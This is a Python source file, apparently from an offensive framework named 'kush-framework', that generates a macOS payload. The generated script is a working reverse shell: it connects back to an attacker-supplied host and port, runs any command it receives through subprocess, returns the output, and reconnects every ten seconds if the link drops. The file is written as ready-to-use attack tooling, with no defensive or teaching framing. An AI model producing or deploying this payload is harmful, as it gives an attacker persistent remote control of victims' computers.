# kush-framework/kush/payloads/macos.py
"""
macOS payload generator
"""

from pathlib import Path
from kush.payloads.templates import PayloadTemplate

class MacOSPayload(PayloadTemplate):
    def generate(self, lhost: str, lport: str, output_name: str,
                 output_dir: Path, **kwargs) -> str:
        if not output_name:
            output_name = f"kush_macos_{lhost}_{lport}"
        
        script_content = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import time

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{lhost}', {lport}))
        
        while True:
            command = s.recv(1024).decode()
            if command == "exit":
                s.close()
                break
            
            output = subprocess.getoutput(command)
            s.send(output.encode())
            
    except Exception:
        time.sleep(10)
'''
        
        script_path = output_dir / output_name
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        script_path.chmod(0o755)
        return str(script_path)